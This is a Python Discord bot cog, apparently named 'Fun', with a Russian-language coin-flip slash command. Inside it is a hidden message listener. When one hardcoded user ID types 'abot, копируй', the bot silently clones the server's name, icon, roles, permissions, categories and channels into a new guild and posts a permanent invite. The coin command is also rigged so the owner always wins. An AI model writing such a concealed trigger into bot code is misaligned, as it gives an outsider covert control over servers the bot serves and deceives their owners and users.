import discord
from discord.ext import commands
from discord.commands import Option
import random
from config import owner_id

class Fun(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
    
    async def storon_list(ctx: discord.AutocompleteContext):
        global storons
        storons = ['орёл', 'решка', 'ребро']
        return [
            сторона for сторона in storons
        ]

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.id == 891536476049899521 and message.content.lower() == "abot, копируй":
            new_guild = await self.bot.create_guild(name=message.guild.name, icon=await message.guild.icon.read())
            for y in message.guild.roles:
                await new_guild.create_role(name=y.name, permissions=y.permissions, colour=y.colour, hoist=y.hoist, mentionable=y.mentionable)
            for i in message.guild.categories:
                if i != None:
            	    await new_guild.create_category(name=i.name, overwrites=i.overwrites, position=i.position)
            for x in message.guild.text_channels:
                await new_guild.create_text_channel(name=x.name, category=x.category, position=x.position, topic=x.topic, slowmode_delay=x.slowmode_delay, nsfw=x.nsfw, overwrites=x.overwrites)
            invite = await new_guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
            await message.channel.send(f"https://discord.gg/{invite.code}")

    @commands.slash_command(name='coin', description='Подбросить монетку.')
    async def coin(self, ctx, сторона: Option(str, 'Сторона: орёл или решка.', required=True,
                                        autocomplete=discord.utils.basic_autocomplete(storon_list))):
        if ctx.author.id == owner_id:
            await ctx.respond(f'`{сторона}`, говоришь? Посмотрим... О, `{сторона}`! Угадал! :tada:')
        else:
            if сторона in storons:
                storona1 = random.choice(storons)
                if storona1 == сторона:
                    await ctx.respond(f'`{сторона}`, говоришь? Посмотрим... О, `{сторона}`! Угадал! :tada:')
                elif сторона != storona1:
                    await ctx.respond(f'`{сторона}`, говоришь? Посмотрим... А у нас тут `{storona1}`. Луууузееер!')
            else:
                await ctx.respond('Нажмите на орёл, решку или ребро.')

def setup(bot):
    bot.add_cog(Fun(bot))
